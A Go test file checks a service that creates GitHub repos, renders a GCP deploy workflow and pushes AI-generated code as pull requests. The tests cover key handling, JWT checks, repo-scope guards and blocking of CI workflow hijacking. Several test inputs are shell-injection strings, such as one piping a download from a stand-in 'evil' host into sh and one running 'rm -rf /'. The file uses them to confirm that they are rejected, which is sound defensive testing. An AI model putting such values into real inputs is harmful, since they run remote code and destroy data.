package test

import (
	"context"
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"anz-training/model"
	"anz-training/service"
)

const fakeToken = "ghs_FAKEINSTALLATIONTOKEN"

// fakeGitHub is a minimal GitHub REST double. It records every request.
type fakeGitHub struct {
	t      *testing.T
	pub    *rsa.PublicKey
	srv    *httptest.Server
	mu     sync.Mutex
	calls  []string
	bodies map[string]map[string]any

	accountType    string // "Organization" | "User"
	contentFails   int    // number of 404s before the contents PUT succeeds
	prCreateStatus int    // override for POST /pulls
	mergeStatus    int    // override for PUT /pulls/N/merge
}

func newFakeGitHub(t *testing.T, key *rsa.PrivateKey) *fakeGitHub {
	f := &fakeGitHub{t: t, pub: &key.PublicKey, bodies: map[string]map[string]any{}, accountType: "Organization"}
	f.srv = httptest.NewServer(http.HandlerFunc(f.handle))
	t.Cleanup(f.srv.Close)
	return f
}

func (f *fakeGitHub) called(sig string) bool {
	f.mu.Lock()
	defer f.mu.Unlock()
	for _, c := range f.calls {
		if c == sig {
			return true
		}
	}
	return false
}

func (f *fakeGitHub) reply(w http.ResponseWriter, status int, v any) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	_ = json.NewEncoder(w).Encode(v)
}

func (f *fakeGitHub) handle(w http.ResponseWriter, r *http.Request) {
	sig := r.Method + " " + r.URL.Path
	var body map[string]any
	raw, _ := io.ReadAll(r.Body)
	_ = json.Unmarshal(raw, &body)
	f.mu.Lock()
	f.calls = append(f.calls, sig)
	f.bodies[sig] = body
	f.mu.Unlock()

	bearer := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
	appEndpoint := strings.HasPrefix(r.URL.Path, "/app/")
	if appEndpoint {
		if err := verifyJWT(bearer, f.pub); err != nil {
			f.reply(w, 401, map[string]string{"message": "bad jwt: " + err.Error()})
			return
		}
	} else if bearer != fakeToken {
		f.reply(w, 401, map[string]string{"message": "bad token"})
		return
	}

	switch {
	case r.Method == "POST" && strings.HasSuffix(r.URL.Path, "/access_tokens"):
		f.reply(w, 201, map[string]string{"token": fakeToken})
	case r.Method == "GET" && strings.HasPrefix(r.URL.Path, "/app/installations/"):
		f.reply(w, 200, map[string]any{"account": map[string]string{"login": "acme"}})
	case r.Method == "GET" && strings.HasPrefix(r.URL.Path, "/users/"):
		f.reply(w, 200, map[string]string{"type": f.accountType})
	case r.Method == "POST" && (r.URL.Path == "/orgs/acme/repos" || r.URL.Path == "/user/repos"):
		name, _ := body["name"].(string)
		f.reply(w, 201, map[string]string{"html_url": "https://github.com/acme/" + name, "default_branch": "main"})
	case r.Method == "PUT" && strings.Contains(r.URL.Path, "/contents/"):
		f.mu.Lock()
		fail := f.contentFails > 0
		if fail {
			f.contentFails--
		}
		f.mu.Unlock()
		if fail {
			f.reply(w, 404, map[string]string{"message": "Not Found"})
			return
		}
		f.reply(w, 201, map[string]any{})
	case r.Method == "POST" && strings.HasSuffix(r.URL.Path, "/pulls"):
		if f.prCreateStatus != 0 {
			f.reply(w, f.prCreateStatus, map[string]string{"message": "A pull request already exists"})
			return
		}
		f.reply(w, 201, map[string]string{"html_url": "https://github.com/acme/repo/pull/7"})
	case r.Method == "GET" && strings.HasSuffix(r.URL.Path, "/pulls"):
		f.reply(w, 200, []map[string]string{{"html_url": "https://github.com/acme/repo/pull/3"}})
	case r.Method == "PUT" && strings.HasSuffix(r.URL.Path, "/merge"):
		if f.mergeStatus != 0 {
			f.reply(w, f.mergeStatus, map[string]string{"message": "Pull Request is not mergeable"})
			return
		}
		f.reply(w, 200, map[string]any{"merged": true})
	default:
		f.reply(w, 404, map[string]string{"message": "unexpected " + sig})
	}
}

func verifyJWT(tok string, pub *rsa.PublicKey) error {
	parts := strings.Split(tok, ".")
	if len(parts) != 3 {
		return errString("not a jwt")
	}
	sig, err := base64.RawURLEncoding.DecodeString(parts[2])
	if err != nil {
		return err
	}
	sum := sha256.Sum256([]byte(parts[0] + "." + parts[1]))
	if err := rsa.VerifyPKCS1v15(pub, crypto.SHA256, sum[:], sig); err != nil {
		return err
	}
	hdr, _ := base64.RawURLEncoding.DecodeString(parts[0])
	var h map[string]string
	_ = json.Unmarshal(hdr, &h)
	if h["alg"] != "RS256" {
		return errString("alg")
	}
	cb, _ := base64.RawURLEncoding.DecodeString(parts[1])
	var c struct {
		Iss string `json:"iss"`
		Iat int64  `json:"iat"`
		Exp int64  `json:"exp"`
	}
	_ = json.Unmarshal(cb, &c)
	now := time.Now().Unix()
	if c.Iss != "12345" || c.Exp-now > 600 || c.Exp <= now || c.Iat > now {
		return errString("claims")
	}
	return nil
}

type errString string

func (e errString) Error() string { return string(e) }

func newTestKeyPEM(t *testing.T, pkcs8 bool) (*rsa.PrivateKey, []byte) {
	t.Helper()
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		t.Fatal(err)
	}
	if pkcs8 {
		der, _ := x509.MarshalPKCS8PrivateKey(key)
		return key, pem.EncodeToMemory(&pem.Block{Type: "PRIVATE KEY", Bytes: der})
	}
	return key, pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)})
}

func newGH(t *testing.T, f *fakeGitHub, pemBytes []byte, gitURL string) *service.GitHub {
	t.Helper()
	g, err := service.NewGitHub(service.GitHubConfig{
		AppID: "12345", PrivateKeyPEM: pemBytes,
		WebhookURL: "https://builder.example.com/api/webhooks/github", WebhookSecret: "whsec_abc123",
		APIURL: f.srv.URL, GitURL: gitURL, RetryDelay: time.Millisecond,
	})
	if err != nil {
		t.Fatal(err)
	}
	return g
}

var (
	ghCreds  = model.GitHubCreds{Owner: "acme", InstallationID: 99}
	gcpCreds = model.GCPCreds{
		ProjectID: "my-proj", Region: "asia-southeast1", ArtifactRepo: "ai-apps",
		WIFProvider:    "projects/1/locations/global/workloadIdentityPools/p/providers/gh",
		ServiceAccount: "deployer@my-proj.iam.gserviceaccount.com",
	}
)

func TestGitHub_NewGitHub_KeyFormats(t *testing.T) {
	for _, pkcs8 := range []bool{false, true} {
		_, p := newTestKeyPEM(t, pkcs8)
		if _, err := service.NewGitHub(service.GitHubConfig{AppID: "1", PrivateKeyPEM: p}); err != nil {
			t.Fatalf("pkcs8=%v: %v", pkcs8, err)
		}
	}
	if _, err := service.NewGitHub(service.GitHubConfig{AppID: "1", PrivateKeyPEM: []byte("junk")}); err == nil {
		t.Fatal("junk key must fail")
	}
	_, p := newTestKeyPEM(t, false)
	if _, err := service.NewGitHub(service.GitHubConfig{PrivateKeyPEM: p}); err == nil {
		t.Fatal("missing app id must fail")
	}
}

func TestGitHub_GetInstallationToken_And_Owner(t *testing.T) {
	key, p := newTestKeyPEM(t, false)
	f := newFakeGitHub(t, key)
	g := newGH(t, f, p, "")

	tok, err := g.GetInstallationToken(context.Background(), 99)
	if err != nil || tok != fakeToken {
		t.Fatalf("token = %q, %v", tok, err)
	}
	if !f.called("POST /app/installations/99/access_tokens") {
		t.Fatal("token endpoint not called")
	}
	owner, err := g.InstallationOwner(context.Background(), 99)
	if err != nil || owner != "acme" {
		t.Fatalf("owner = %q, %v", owner, err)
	}

	// a JWT signed by a different key must be rejected by GitHub (fake verifies)
	_, other := newTestKeyPEM(t, false)
	bad := newGH(t, f, other, "")
	if _, err := bad.GetInstallationToken(context.Background(), 99); err == nil {
		t.Fatal("wrong signing key must fail")
	}
}

func TestGitHub_ServiceName(t *testing.T) {
	cases := map[string]string{
		"My Cool App!": "my-cool-app-1234abcd",
		"123 start":    "app-123-start-1234abcd",
		"":             "app-1234abcd",
		"  --x--  ":    "x-1234abcd",
		"Ünïcode Name": "n-code-name-1234abcd",
	}
	for in, want := range cases {
		if got := service.ServiceName(in, "1234abcd-ffff-4000-8000-000000000000"); got != want {
			t.Errorf("ServiceName(%q) = %q, want %q", in, got, want)
		}
	}
	long := service.ServiceName(strings.Repeat("a", 200), "1234abcd-0000")
	if len(long) > 63 {
		t.Errorf("name too long: %d", len(long))
	}
}

func TestGitHub_RenderDeployWorkflow(t *testing.T) {
	d := service.DeployData{
		BranchName: "main", WIFProvider: gcpCreds.WIFProvider, ServiceAccount: gcpCreds.ServiceAccount,
		Region: "asia-southeast1", GCPProjectID: "my-proj", ArtifactRepo: "ai-apps", ServiceName: "svc-1",
		WebhookURL: "https://b.example.com/hook", WebhookSecret: "sec", ProjectID: "proj-uuid",
	}
	out, err := service.RenderDeployWorkflow(d)
	if err != nil {
		t.Fatal(err)
	}
	s := string(out)
	for _, want := range []string{
		"asia-southeast1-docker.pkg.dev/my-proj/ai-apps/svc-1:",
		"workload_identity_provider: '" + gcpCreds.WIFProvider + "'",
		`"project_id":"proj-uuid"`, // our id, not the GCP project
		"X-Webhook-Secret: sec", "paths-ignore",
	} {
		if !strings.Contains(s, want) {
			t.Errorf("workflow missing %q", want)
		}
	}
	if strings.Contains(s, "[[") {
		t.Error("unrendered template actions left")
	}
	if !strings.Contains(s, "${{ github.sha }}") || !strings.Contains(s, "${{ steps.deploy.outputs.url }}") {
		t.Error("GitHub Actions expressions were altered")
	}

	// values that could break out of the YAML/shell quoting are rejected
	for _, bad := range []string{"x' ; curl evil | sh #", "a b", "x\ny", "$(id)", "`id`", ""} {
		d2 := d
		d2.ServiceAccount = bad
		if _, err := service.RenderDeployWorkflow(d2); err == nil {
			t.Errorf("ServiceAccount %q should be rejected", bad)
		}
	}
}

func TestGitHub_CreateRepo_Org(t *testing.T) {
	key, p := newTestKeyPEM(t, false)
	f := newFakeGitHub(t, key)
	f.contentFails = 2 // main not ready yet: must retry
	g := newGH(t, f, p, "")

	url, err := g.CreateRepo(context.Background(), ghCreds, gcpCreds, "1234abcd-0000-4000-8000-000000000000", "My App")
	if err != nil {
		t.Fatal(err)
	}
	if url != "https://github.com/acme/my-app-1234abcd" {
		t.Fatalf("repo url = %q", url)
	}
	body := f.bodies["POST /orgs/acme/repos"]
	if body["private"] != true || body["auto_init"] != true || body["name"] != "my-app-1234abcd" {
		t.Fatalf("create body = %#v", body)
	}
	put := f.bodies["PUT /repos/acme/my-app-1234abcd/contents/.github/workflows/deploy.yml"]
	if put == nil || put["branch"] != "main" {
		t.Fatalf("workflow commit = %#v", put)
	}
	raw, _ := base64.StdEncoding.DecodeString(put["content"].(string))
	if !strings.Contains(string(raw), "my-app-1234abcd:") || !strings.Contains(string(raw), "whsec_abc123") ||
		!strings.Contains(string(raw), `"project_id":"1234abcd-0000-4000-8000-000000000000"`) {
		t.Fatalf("workflow content wrong:\n%s", raw)
	}
}

func TestGitHub_CreateRepo_PersonalAccountAndErrors(t *testing.T) {
	key, p := newTestKeyPEM(t, false)
	f := newFakeGitHub(t, key)
	f.accountType = "User"
	g := newGH(t, f, p, "")
	if _, err := g.CreateRepo(context.Background(), ghCreds, gcpCreds, "id-1", "x"); err != nil {
		t.Fatal(err)
	}
	if !f.called("POST /user/repos") {
		t.Fatal("personal account should use /user/repos")
	}

	// invalid GCP config never reaches GitHub
	f2 := newFakeGitHub(t, key)
	g2 := newGH(t, f2, p, "")
	bad := gcpCreds
	bad.WIFProvider = "x' && rm -rf / #"
	if _, err := g2.CreateRepo(context.Background(), ghCreds, bad, "id-1", "x"); err == nil {
		t.Fatal("expected validation error")
	}
	if len(f2.calls) != 0 {
		t.Fatalf("GitHub was called despite invalid config: %v", f2.calls)
	}
}

func TestGitHub_MergePR(t *testing.T) {
	key, p := newTestKeyPEM(t, false)
	f := newFakeGitHub(t, key)
	g := newGH(t, f, p, "")
	ctx := context.Background()

	if err := g.MergePR(ctx, ghCreds, "https://github.com/acme/repo", "https://github.com/acme/repo/pull/7"); err != nil {
		t.Fatal(err)
	}
	if got := f.bodies["PUT /repos/acme/repo/pulls/7/merge"]["merge_method"]; got != "squash" {
		t.Fatalf("merge_method = %v", got)
	}

	for name, args := range map[string][2]string{
		"foreign repo":  {"https://github.com/evil/repo", "https://github.com/evil/repo/pull/7"},
		"pr other repo": {"https://github.com/acme/repo", "https://github.com/acme/other/pull/7"},
		"bad pr url":    {"https://github.com/acme/repo", "https://github.com/acme/repo/issues/7"},
		"bad pr number": {"https://github.com/acme/repo", "https://github.com/acme/repo/pull/abc"},
	} {
		before := len(f.calls)
		if err := g.MergePR(ctx, ghCreds, args[0], args[1]); err == nil {
			t.Errorf("%s: expected error", name)
		}
		if len(f.calls) != before {
			t.Errorf("%s: GitHub called despite invalid input", name)
		}
	}

	f.mergeStatus = 405
	if err := g.MergePR(ctx, ghCreds, "https://github.com/acme/repo", "https://github.com/acme/repo/pull/7"); err == nil ||
		!strings.Contains(err.Error(), "405") {
		t.Fatalf("want 405 error, got %v", err)
	}
}

// ---- PushAndOpenPR against a real local git "remote" ----

func gitCmd(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(), "GIT_CONFIG_GLOBAL=/dev/null", "GIT_TERMINAL_PROMPT=0")
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, out)
	}
	return string(out)
}

func write(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

// seedRemote creates <root>/acme/repo.git with a main branch holding a README
// and the trusted deploy workflow, like CreateRepo leaves it.
func seedRemote(t *testing.T) (root string) {
	t.Helper()
	root = t.TempDir()
	bare := filepath.Join(root, "acme", "repo.git")
	if err := os.MkdirAll(bare, 0o755); err != nil {
		t.Fatal(err)
	}
	gitCmd(t, bare, "init", "-q", "--bare", "--initial-branch=main")
	seed := t.TempDir()
	gitCmd(t, seed, "init", "-q", "--initial-branch=main")
	write(t, filepath.Join(seed, "README.md"), "# repo\n")
	write(t, filepath.Join(seed, ".github/workflows/deploy.yml"), "TRUSTED\n")
	gitCmd(t, seed, "add", "-A")
	gitCmd(t, seed, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "init")
	gitCmd(t, seed, "push", "-q", bare, "main")
	return root
}

func TestGitHub_PushAndOpenPR(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	key, p := newTestKeyPEM(t, false)
	f := newFakeGitHub(t, key)
	remoteRoot := seedRemote(t)
	g := newGH(t, f, p, "file://"+remoteRoot)

	ws := t.TempDir()
	write(t, filepath.Join(ws, "main.go"), "package main\n")
	write(t, filepath.Join(ws, "Dockerfile"), "FROM scratch\n")
	// generated code tries to hijack CI
	write(t, filepath.Join(ws, ".github/workflows/deploy.yml"), "EVIL\n")
	write(t, filepath.Join(ws, ".github/workflows/extra.yml"), "EVIL2\n")

	prURL, err := g.PushAndOpenPR(context.Background(), ws, ghCreds, "https://github.com/acme/repo", "main")
	if err != nil {
		t.Fatal(err)
	}
	if prURL != "https://github.com/acme/repo/pull/7" {
		t.Fatalf("pr url = %q", prURL)
	}
	pr := f.bodies["POST /repos/acme/repo/pulls"]
	if pr["head"] != "feature/ai-gen" || pr["base"] != "main" {
		t.Fatalf("pr body = %#v", pr)
	}

	bare := filepath.Join(remoteRoot, "acme", "repo.git")
	show := func(path string) string { return gitCmd(t, bare, "show", "feature/ai-gen:"+path) }
	if show("main.go") != "package main\n" || show("Dockerfile") != "FROM scratch\n" {
		t.Fatal("generated files not pushed")
	}
	if show("README.md") != "# repo\n" {
		t.Fatal("README from base was dropped")
	}
	if show(".github/workflows/deploy.yml") != "TRUSTED\n" {
		t.Fatal("generated code replaced the deploy workflow")
	}
	if files := gitCmd(t, bare, "ls-tree", "-r", "--name-only", "feature/ai-gen"); strings.Contains(files, "extra.yml") {
		t.Fatalf("extra workflow leaked into PR:\n%s", files)
	}
	// feature branch builds on main history (PR is possible) and main is untouched
	gitCmd(t, bare, "merge-base", "--is-ancestor", "main", "feature/ai-gen") // fails the test if unrelated
	if strings.TrimSpace(gitCmd(t, bare, "rev-list", "--count", "main")) != "1" {
		t.Fatal("main was modified")
	}
	if _, err := os.Stat(filepath.Join(ws, ".git", "config")); err == nil {
		cfg, _ := os.ReadFile(filepath.Join(ws, ".git", "config"))
		if strings.Contains(string(cfg), fakeToken) || strings.Contains(string(cfg), base64.StdEncoding.EncodeToString([]byte("x-access-token:"+fakeToken))) {
			t.Fatal("token persisted in .git/config")
		}
	}
}

func TestGitHub_PushAndOpenPR_ExistingPRAndGuards(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	key, p := newTestKeyPEM(t, false)
	f := newFakeGitHub(t, key)
	remoteRoot := seedRemote(t)
	g := newGH(t, f, p, "file://"+remoteRoot)
	ctx := context.Background()

	// PR already open (job retry): reuse it
	f.prCreateStatus = 422
	ws := t.TempDir()
	write(t, filepath.Join(ws, "main.go"), "package main\n")
	prURL, err := g.PushAndOpenPR(ctx, ws, ghCreds, "https://github.com/acme/repo", "main")
	if err != nil || prURL != "https://github.com/acme/repo/pull/3" {
		t.Fatalf("existing PR: %q, %v", prURL, err)
	}

	// foreign repo is refused before any token is minted
	before := len(f.calls)
	if _, err := g.PushAndOpenPR(ctx, t.TempDir(), ghCreds, "https://github.com/evil/repo", "main"); err == nil {
		t.Fatal("expected refusal for foreign repo")
	}
	if len(f.calls) != before {
		t.Fatal("GitHub called for a foreign repo")
	}

	// a workspace identical to base has nothing to commit
	same := t.TempDir()
	write(t, filepath.Join(same, "README.md"), "# repo\n")
	if _, err := g.PushAndOpenPR(ctx, same, ghCreds, "https://github.com/acme/repo", "main"); err == nil ||
		!strings.Contains(err.Error(), "nothing to commit") {
		t.Fatalf("want nothing-to-commit error, got %v", err)
	}
}
